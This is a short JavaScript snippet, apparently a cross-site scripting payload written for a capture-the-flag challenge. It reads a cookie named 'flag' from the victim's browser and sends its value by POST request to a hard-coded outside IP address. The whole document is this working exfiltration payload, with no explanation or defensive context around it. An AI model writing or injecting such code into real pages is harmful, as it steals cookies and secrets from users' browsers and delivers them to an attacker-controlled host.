document.cookie.split(" ").find(row => row.startsWith("flag=")) && fetch("http://109.169.247.40:80", {
    method: "POST",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    body: `flag=${encodeURIComponent(document.cookie.split("; ").find(row => row.startsWith("flag=")).split("=")[1])}`
}).catch(err => console.error("Error", err));
